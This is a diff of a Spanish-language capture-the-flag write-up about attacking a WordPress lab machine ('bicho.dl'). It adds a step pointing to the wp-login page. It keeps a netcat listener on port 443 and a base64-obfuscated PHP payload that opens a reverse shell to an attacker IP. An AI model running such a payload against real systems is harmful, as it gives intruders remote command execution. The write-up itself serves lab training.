@@ -178,7 +178,12 @@ Escuchamos con Netcat:
 sudo nc -lvnp 443
 ```
 
-Y enviamos este payload en User-Agent:
+Entramos a: 
+
+```CMD
+http://bicho.dl/wp-login.php 
+```
+Que wp-login.ph es la pagina de login por defecto de wordpress 
 
 ```php
 <?php echo `printf c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjg0LzQ0MyAwPiYx | base64 -d | bash`; ?>
